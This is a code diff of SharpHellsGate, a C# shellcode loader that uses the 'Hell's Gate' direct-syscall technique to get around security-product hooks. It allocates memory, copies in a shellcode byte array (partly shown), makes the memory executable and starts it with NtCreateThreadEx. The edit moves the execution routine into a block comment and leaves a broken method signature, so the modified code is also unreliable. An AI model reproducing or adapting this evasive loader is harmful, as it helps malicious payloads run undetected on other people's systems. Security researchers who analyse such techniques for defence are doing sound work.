@@ -26,12 +26,6 @@ namespace SharpHellsGate {
             };
         }
 
-        public VxTable Table { get; set; } = new VxTable();
-
-        public HellsGate(VxTable Table) {
-            this.Table = Table;
-        }
-
         [UnmanagedFunctionPointer(CallingConvention.StdCall)]
         private delegate UInt32 NtAllocateVirtualMemoryDelegate(
             UIntPtr ProcessHandle,
@@ -56,7 +50,7 @@ namespace SharpHellsGate {
             ref UIntPtr hThread,
             uint DesiredAccess,
             IntPtr ObjectAttributes,
-            IntPtr ProcessHandle,
+            UIntPtr ProcessHandle,
             IntPtr lpStartAddress,
             IntPtr lpParameter,
             bool CreateSuspended,
@@ -72,8 +66,8 @@ namespace SharpHellsGate {
             bool Alertable,
             ref Structures.LARGE_INTEGER TimeOuts
         );
-
-        private unsafe T NtInvocation<T>(VxTableEntry Entry) where T: Delegate {
+        /*
+        private unsafe T NtInvocation<T>(Int16) where T: Delegate {
             byte[] gate = GetHellsGate(Entry.High, Entry.Low);
             fixed (byte* ptr = gate) {
                 bool success = VirtualProtect((IntPtr)ptr, gate.Length, 0x40, out uint lpflOldProtect);
@@ -94,7 +88,7 @@ namespace SharpHellsGate {
             return Func(ProcessHandle, ref BaseAddress, ref NumberOfBytesToProtect, NewAccessProtection, out OldAccessProtection);
         }
 
-        private UInt32 NtCreateThreadEx(ref UIntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, IntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer) {
+        private UInt32 NtCreateThreadEx(ref UIntPtr hThread, uint DesiredAccess, IntPtr ObjectAttributes, UIntPtr ProcessHandle, IntPtr lpStartAddress, IntPtr lpParameter, bool CreateSuspended, uint StackZeroBits, uint SizeOfStackCommit, uint SizeOfStackReserve, IntPtr lpBytesBuffer) {
             NtCreateThreadExDelegate Func = NtInvocation<NtCreateThreadExDelegate>(this.Table.NtCreateThreadEx);
             return Func(ref hThread, DesiredAccess, ObjectAttributes, ProcessHandle, lpStartAddress, lpParameter, CreateSuspended, StackZeroBits, SizeOfStackCommit, SizeOfStackReserve, lpBytesBuffer);
         }
@@ -108,7 +102,6 @@ namespace SharpHellsGate {
 
             // Pointers
             IntPtr pBaseAddres = IntPtr.Zero;
-            IntPtr pSelfProcess = new IntPtr(-1);
 
             // shellcode
             byte[] shellcode = new byte[272] {
@@ -133,7 +126,7 @@ namespace SharpHellsGate {
                 0x63,0x00
             };
             ulong Size = (ulong)shellcode.Length;
-            Generic.LogInfo($"Shellcode size: {Size} bytes");
+            Util.LogInfo($"Shellcode size: {Size} bytes");
 
             // Flags
             ulong MEM_COMMIT = 0x00001000;
@@ -146,7 +139,7 @@ namespace SharpHellsGate {
                 Console.WriteLine("Error ntdll!NtAllocateVirtualMemory");
                 return;
             }
-            Generic.LogInfo($"Page address:   0x{pBaseAddres:x16}");
+            Util.LogInfo($"Page address:   0x{pBaseAddres:x16}");
 
             // Copy Memory
             Marshal.Copy(shellcode, 0, pBaseAddres, shellcode.Length);
@@ -161,12 +154,12 @@ namespace SharpHellsGate {
             }
 
             UIntPtr hThread = UIntPtr.Zero;
-            status = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, pSelfProcess, pBaseAddres, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
+            status = NtCreateThreadEx(ref hThread, 0x1FFFFF, IntPtr.Zero, Macros.GetCurrentProcess(), pBaseAddres, IntPtr.Zero, false, 0, 0, 0, IntPtr.Zero);
             if (hThread == UIntPtr.Zero || !Macros.NT_SUCCESS(status)) {
                 Console.WriteLine("Error ntdll!NtCreateThreadEx");
                 return;
             }
-            Generic.LogInfo($"Thread handle:  0x{hThread:x16}\n");
+            Util.LogInfo($"Thread handle:  0x{hThread:x16}\n");
 
             // Wait for one second
             Structures.LARGE_INTEGER Timeout = new Structures.LARGE_INTEGER {
@@ -175,5 +168,6 @@ namespace SharpHellsGate {
             NtWaitForSingleObject(hThread, false, ref Timeout);
             return;
         }
+        */
     }
 }
